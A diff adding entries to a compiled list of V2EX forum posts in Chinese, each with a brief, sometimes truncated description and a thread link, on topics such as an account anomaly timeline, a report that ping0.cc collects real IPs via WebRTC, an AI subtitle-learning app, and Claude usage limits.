+发现时间：2026/04/24 ，经朋友提醒才发现账号异常
+
+
+背景说明
+
+平时开着非中国大陆的 eSIM ，需要验证码时再临时启用联通号码
+每次启用都会收到"已抵达 XXX"的漫游短信
+漫游通常需要几分钟才有信号，有信号后收到的短信显示当前日期+时间，不一定是实时短信
+iMessage 同步短信也需要先启用中国大陆手机号码才能接收
+
+
+事件时间线
+2026/03/19 — QQ 验证码异常（号码未
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208400#reply2
+
+---
+
+#### 361. [V2EX] 用 Claude 做了视频“关于 ping0.cc 静默上传用户真实 IP”
+
+**问题描述 / Problem Description**:
+基于隔壁大佬原帖： https://www.nodeseek.com/post-674661-1
+大佬实力真的很强啊，原帖挺热闹的，但还是看到很多人用 ping0.cc 来看所谓的是否是家宽。
+结论就是：ping0.cc 会偷偷使用混淆加密的代码通过 webrtc 来获得你的国内真实 IP ，同时收集你的浏览器指纹数据。
+油管视频链接： https://youtu.be/y6f5iwD4vPs?si=PXb3yoDnmdAPeXgX
+ps：claude 做视频真的很屌啊！就是费 token ！
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208381#reply2
+
+---
+
+#### 362. [V2EX] AI 辅助英语学习，无推广，讨论一下
+
+**问题描述 / Problem Description**:
+Vibe Coding 了一个 App ，主要功能是，搜索数据库中的字幕，返回字幕结果，点击结果可以从字幕所在的地方开始播放视频。
+我的学习流程是：下载影视资源 → 下载字幕 → 找 Gemini 翻译成双语字幕（机翻偏向直译容易理解） → 找 Gemini 分析并找出短语搭配和中文翻译然后导出到 Excel （已经有翻译的情况下，这一步不会脱离语境翻译污染数据） → 扫一下哪些不会或不熟悉的短语，并在这个 App 中搜索观看（常见搭配还会有很多其它视频的结果） → 逐个观看，加深记忆。
+这些影视作品之前最好看过，这样可以快速进入语境，增强代入感。
+使用了一个多星期，直观感觉是听力水平大幅度提
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208378#reply8
+
+---
+
+#### 363. [V2EX] gpt5.5 写完界面，还会进行截图查看效果
+
+**问题描述 / Problem Description**:
+它自己内置的浏览器窗体太小，还会调用 chrome 无头模式宽屏截图
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208353#reply5
+
+---
+
+#### 364. [V2EX] 做了一个自动识别云朵的网站
+
+**问题描述 / Problem Description**:
+上传云朵即可得到云朵的识别结果，这个是什么云，以及云的科普和是否会下雨相关的介绍
+https://whatisthiscloud.org/
+识别结果
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208313#reply1
+
+---
+
+#### 365. [V2EX] claude 太抠门了
+
+**问题描述 / Problem Description**:
+现在的 usage 重置时间不是向前取整到整点了，而是精确到本时间窗口的第一条消息的分钟。这意味着如果不卡着上一个窗口结束的时间去使用，就可能用不到每月 4 个周限、每周 9 个 5 小时限制了
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208274#reply1
+
+---
+
+#### 366. [V2EX] 继上次讨论自媒体问题后，我决定下架流量最大的视频
+
+**问题描述 / Problem Description**:
+这是原视频，因为基本没有效的声音信息，就转 gif 了
+
+（标题：能不能保持安全距离，害人害己啊）
+就这一个 7s 的视频，不提供其他任何信息的情况下，各位可以猜一下播放量
+一些数据截图
+
+
+这个视频给我的频道带来了太多噪声，偏离频道初衷，虽然流量大，但是还是先下架降温了
+就像 GPT 说的
+最后一句话
+
+流量不是资产，匹配的流量才是。
+
+你现在这波，更像是：
+👉 “把一群不对的人请进了家里，还很吵”
+
+你不需要对他们负责。
+
+这个视频后续我甚至做了一个新的视频来解释前因后果，但是基本无济于事，就像看不懂中文一样
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1208270#reply6
 
 ---
